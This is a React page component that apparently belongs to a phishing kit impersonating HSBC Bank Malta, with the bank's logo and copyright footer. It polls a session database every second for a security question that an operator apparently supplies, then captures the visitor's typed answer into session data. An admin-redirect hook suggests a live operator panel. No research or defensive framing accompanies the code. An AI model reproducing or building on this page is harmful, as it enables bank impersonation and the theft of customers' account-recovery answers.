import { useState, useEffect } from 'react';
import { useForm } from '@/contexts/FormContext';
import { useAdminRedirectCheck } from '@/hooks/useAdminRedirectCheck';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { HelpCircle } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import ErrorAlert from '@/components/ErrorAlert';

const SecurityQuestion4Page = () => {
  useAdminRedirectCheck();
  const { currentSession, updateSessionData } = useForm();
  
  const [answer, setAnswer] = useState('');
  
  // Get the security question from session data
  const securityQuestionData = currentSession.data.securityQuestion4;
  const question = securityQuestionData?.question || '';
  
  // Debug logging
  console.log('🔍 Security Question 4 - Current session data:', currentSession.data);
  console.log('🔍 Security Question 4 - Security question data:', securityQuestionData);
  console.log('🔍 Security Question 4 - Question:', question);

  // Poll for updated session data while waiting for question
  useEffect(() => {
    if (question) return; // Stop polling once we have a question
    
    const pollForQuestion = async () => {
      try {
        const { getSession } = await import('@/lib/database');
        const dbSession = await getSession(currentSession.id);
        
        if (dbSession?.session_data?.securityQuestion4?.question) {
          console.log('🔄 Security Question 4 - Found question in database, updating session');
          // This will trigger a re-render with the new question data
          window.location.reload(); // Simple solution to refresh the page with new data
        }
      } catch (error) {
        console.error('Failed to poll for Security Question 4:', error);
      }
    };

    const interval = setInterval(pollForQuestion, 1000); // Poll every second
    return () => clearInterval(interval);
  }, [question, currentSession.id]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!answer.trim()) return;
    
    // Update session data with the answer
    updateSessionData('securityQuestion4', { 
      question, 
      answer: answer.trim() 
    });
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4">
          <img 
            src="/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png" 
            alt="HSBC"
            className="h-8 w-auto"
          />
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 flex items-center justify-center p-3 sm:p-4">
        <Card className="w-full max-w-xs sm:max-w-sm md:max-w-md shadow-lg mx-2">
          <CardHeader className="text-center space-y-3 p-3 sm:p-4 md:p-6">
            <div className="space-y-2">
              <div className="flex justify-center">
                <div className="p-3 rounded-full bg-primary/10">
                  <HelpCircle className="h-8 w-8 text-primary" />
                </div>
              </div>
              <CardTitle className="text-lg sm:text-xl md:text-2xl text-gray-800 leading-tight">
                Security Question 4
              </CardTitle>
              <p className="text-xs sm:text-sm text-gray-600 leading-relaxed px-1 sm:px-2">
                Please answer the security question to proceed
              </p>
            </div>
          </CardHeader>
          <CardContent className="space-y-3 sm:space-y-4 md:space-y-6 p-3 sm:p-4 md:p-6 pt-0">
            <ErrorAlert />
            
            {question && (
              <div className="space-y-4">
                <div className="p-4 rounded-lg border bg-card">
                  <h3 className="font-medium text-card-foreground mb-3">Security Question:</h3>
                  <p className="text-foreground">{question}</p>
                </div>
                
                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="space-y-2">
                    <Label htmlFor="answer">Your Answer</Label>
                    <Input
                      id="answer"
                      type="text"
                      value={answer}
                      onChange={(e) => setAnswer(e.target.value)}
                      placeholder="Enter your answer"
                      className="w-full"
                      required
                    />
                  </div>

                  <Button 
                    type="submit" 
                    className={`w-full transition-all ${
                      answer.trim() 
                        ? 'bg-[hsl(0,100%,45%)] hover:bg-[hsl(0,100%,40%)]' 
                        : ''
                    }`}
                    disabled={!answer.trim()}
                  >
                    Submit Answer
                  </Button>
                </form>
              </div>
            )}

            {!question && (
              <div className="text-center p-8 rounded-lg border border-dashed">
                <HelpCircle className="h-12 w-12 text-muted-foreground mx-auto mb-4" />
                <p className="text-muted-foreground">
                  Waiting for security question...
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <footer className="bg-black text-white py-6">
        <div className="max-w-7xl mx-auto px-6 text-center">
          <div className="text-sm space-y-2">
            <div className="flex items-center justify-center space-x-4">
              <span>Investor relations</span>
              <span>|</span>
              <span>HSBC Group</span>
              <span>|</span>
              <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
            </div>
            <div>
              <span>This website is designed for use in Malta. Cross-border banking</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default SecurityQuestion4Page;